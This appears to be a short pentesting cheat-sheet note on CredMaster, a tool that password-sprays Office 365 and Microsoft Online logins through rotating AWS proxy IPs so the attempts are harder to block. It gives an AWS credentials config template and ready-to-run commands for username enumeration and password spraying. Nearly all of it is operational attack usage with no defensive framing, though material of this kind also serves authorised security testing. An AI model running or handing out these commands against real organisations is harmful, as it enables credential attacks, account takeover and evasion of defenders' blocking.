
# CredMaster
> "Launch a password spray / brute force attach via Amazon AWS passthrough proxies, shifting the requesting IP address for every authentication attempt. This dynamically creates FireProx APIs for more evasive password sprays."
> -GitHub
## Use
Needs an AWS key to spin up EC2 instances for the job. Put into `aws.config`.
```json
{
        "region" : "us-east-1",
        "access_key" : "",
        "secret_access_key" : "",
        "session_token" : null,
        "profile_name" : null                                           
}
```
### O365 User Enum
```bash
python3 credmaster.py --plugin o365enum --config aws.config -u usernames.txt -t 8 
```
CredMaster will also create a `credmaster-validusers.txt` file with all of the valid usernames it finds with this command.
### Spraying Plugin
```bash
python3 credmaster.py --plugin msol --config aws.config -u credmaster-validusers.txt -p passwords.txt -o 
```

> [!Resources]
> - [GitHub](https://github.com/knavesec/CredMaster)